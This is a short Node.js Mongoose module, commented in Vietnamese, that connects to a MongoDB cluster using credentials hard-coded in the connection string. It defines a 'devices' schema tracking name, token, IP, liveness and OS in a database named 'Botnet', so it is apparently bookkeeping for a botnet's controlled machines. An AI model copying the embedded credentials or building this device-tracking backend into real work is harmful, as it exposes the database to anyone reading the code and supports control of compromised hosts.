/* 
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
'use strict';
var mongoose = require('mongoose');
var db;
//Thiết lập một kết nối mongoose mặc định
var mongoDB = "mongodb://trungnv2:trungnv2@cluster0-shard-00-00-ihbws.gcp.mongodb.net:27017,cluster0-shard-00-01-ihbws.gcp.mongodb.net:27017,cluster0-shard-00-02-ihbws.gcp.mongodb.net:27017/Botnet?ssl=true&replicaSet=Cluster0-shard-0&authSource=admin&retryWrites=true";
exports.init = function () {
    mongoose.connect(mongoDB, {poolSize: 4,useNewUrlParser: true}).then(() => console.log('MongoDB connected…'))
            .catch(err => console.log(err));
//Ép Mongoose sử dụng thư viện promise toàn cục
    mongoose.Promise = global.Promise;
//Lấy kết nối mặc định
    db = mongoose.connection;
//Ràng buộc kết nối với sự kiện lỗi (để lấy ra thông báo khi có lỗi)
    db.on('error', console.error.bind(console, 'MongoDB connection error:'));
};
exports.createBotnet = function () {
    var Schema = mongoose.Schema;
    var schema = new Schema(
            {
                name: String,
                token: String,
                ip: String,
                isAlive: Boolean,
                updated: {type: Date, default: Date.now},
                os: String,
                struct: String,
                mixed: Schema.Types.Mixed,
                _uId: Schema.Types.ObjectId,
                nested: {stuff: {type: String, lowercase: true, trim: true}}
            });
    var SomeModel = mongoose.model('devices', schema);
    console.log("log" + JSON.stringify(SomeModel));
};